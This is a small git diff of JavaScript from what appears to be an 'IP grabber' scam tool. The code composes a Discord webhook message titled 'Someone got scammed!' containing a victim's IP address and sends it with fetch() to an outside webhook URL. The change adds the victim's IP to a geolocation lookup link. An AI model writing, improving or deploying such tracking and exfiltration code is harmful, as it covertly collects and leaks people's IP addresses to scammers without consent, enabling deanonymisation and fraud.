@@ -5,7 +5,7 @@ async function run(wurl) {
 	body = {"username":"IP grabber", "embeds":[
 		{
 			"title":"Someone got scammed!",
-		 	"description":`Here's their IP: ${ip}.\n[click here](http://www.geoplugin.net/json.gp?ip=) for more informations about this IP.`,
+		 	"description":`Here's their IP: ${ip}.\n[click here](http://www.geoplugin.net/json.gp?ip=${ip}) for more informations about this IP.`,
 			"footer":{"text":"OyoPlayer IP Grabber [https://oyo-player.github.io/test/]", "url_icon":"https://cdn.discordapp.com/avatars/699555028142129182/08d108218afd02d6db6d1feffa095302?size=1024"}}
 	]}
 	fetch(wurl, {"method":"POST", "headers":{"content-type": "application/json"}, "body":JSON.stringify(body)})
